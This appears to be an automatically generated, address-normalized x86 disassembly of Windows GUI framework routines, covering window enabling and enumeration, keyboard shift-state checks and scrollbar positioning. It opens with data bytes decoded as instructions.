add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d000d ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
add [ eax + edx ] bh
[ esi + 0x5b ]
retn
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
lodsb [ esi ]
dec esi
inc ebp
add [ esp ] bh
inc ecx
add [ edx ] al
add [ 0x6d726f46 ] al
jae r-xdata
xor al [ eax ]
xor [ edx ] 0x40
add [ eax ] cl
push esp
dec ebp
outsb
arpl [ eax - 0x70 ] bp
jl r-xdata
add [ ecx + rw-data ] ah
retn
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0xd400408d
dec ebp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 2 ] al
inc ebp
add [ esi + ecx * 2 ] ah
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dl
dec esi
inc ebp
add [ eax + 0x40000000 ] ah
and eax [ ecx ]
pushfd
fwait
inc ecx
add ah ah
xor al 0x40
add al dh
xchg esp eax
inc ecx
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ ebx + 0x41140045 ] bh
inc ecx
add [ edi + edx * 4 + 0x40300041 ] ah
inc ecx
add [ eax + ebx * 4 + 0x41 ] bh
add [ eax - 0x69 ] cl
inc ecx
add [ eax + ebx * 4 - 0x667bffbf ] cl
inc ecx
add [ ebx + ebx * 4 - 0x6763ffbf ] dh
inc ecx
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add al bl
mov ecx 0xe0045
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
cmp [ eax ] al
add [ eax ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
mov eax eax
and al 0x4e
inc ebp
add [ edi ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
aam 0x4d
inc ebp
add [ esp ] bh
inc ecx
add [ edx ] al
add [ 0x6d726f46 ] al
jae r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_454f58
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_454fa4
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45e6a4
mov eax [ rw-data ]
call sub_4196cc
mov eax [ rw-data ]
call sub_419674
retn
push 0x0
push eax
call ShowOwnedPopups
sub_454fdc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_4026bc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_45502c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_4550cf
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_403730#7
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_454fdc
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4550d6
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_4550e0
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_4026dc
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_455118
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_45517c
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_455118
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_4551d8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_4551f8
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_4551d8
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_455224
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_45bc84
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_45c0f4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407c90
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45bc70
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45c0e0
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407c90
test eax eax
je r-xdata
sub_4552a4
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_4552f8
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_455334
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_455380
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4553de
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_452f3c
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_4041c8
mov eax [ ebp - 0x8 ]
pop edx
call sub_407c90
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4553e5
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404004
retn
sub_4553f0
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_455418
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_455489
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4553f0
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455490
lea eax [ ebp - 0xc ]
call sub_403fe0
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4cc
call sub_403a1c
sub_455498
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403260
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_455528
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414030
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_455df0
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_455dd0
mov edx [ edi + 0xc ]
mov eax ebx
call sub_455c80
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_455578
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_455730
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_43e7c0
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_455c80
xor edx edx
mov eax ebx
call sub_455c80
jmp r-xdata
sub_4555b0
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_423a38
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_45561c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_423a38
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_455684
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_455db8
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_441698
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_455db8
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_44165c
call sub_45561c
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_44165c
call sub_4555b0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_455730
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_444968
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_455768
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_444968
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_45579c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_455768
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_455768
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_455818
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_444968
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_45579c
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43db50
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_45579c
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43db94
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_4558b0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_444968
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_455910
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_455ae1 ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_455c80
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_455c80
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_455818
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_455c80
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_455818
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_455c80
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_455c80
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_455c80
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_455c80
jmp r-xdata
push ebp
call sub_4558b0
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_455c80
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_455c80
jmp r-xdata
push ebp
call sub_4558b0
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_455c80
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_4069a4
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_455c80
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_455c80
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_455c80
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_455c80
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_455c80
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_455c80
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_455c80
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_455c80
jmp r-xdata
sub_455c08
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_4562f8
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_455c80
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_444968
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_444968
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_444520
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_444520
jmp r-xdata
call sub_4553f0
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_455d44
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_4562f8
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_455dfc
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_444968
push eax
call sub_425660
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_444968
push eax
call sub_425660
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_444968
push eax
call sub_425660
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_41c268
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_444968
push eax
call sub_425660
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_444968
push eax
call sub_425660
sub_455f04
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
